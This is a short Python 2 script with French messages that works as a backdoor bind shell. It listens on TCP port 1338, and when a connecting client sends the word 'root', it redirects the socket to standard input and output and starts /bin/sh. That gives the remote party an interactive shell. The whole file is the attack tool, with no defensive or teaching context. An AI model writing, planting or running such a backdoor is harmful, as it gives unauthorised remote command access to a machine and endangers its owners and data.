#!/usr/bin/env python
#--*-- coding:UTF-8 --*--

import socket, os, code

host=''
port = 1338
mot=""
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.bind((host,port))
s.listen(1)
client,adresse=s.accept()
print adresse
print client.getpeername()
client.send("Bonjour eni\n")
mot=client.recv(1024)
print mot
while 1:
    if mot=="root\n":
        print "on est dans root"
        for f in range (3):
            os.dup2(client.fileno(), f)
        os.execl("/bin/sh", "/bin/sh")
        code.interact()
        sys.exit()
    else:
        print "on sort"
        break
client.close()
s.close()
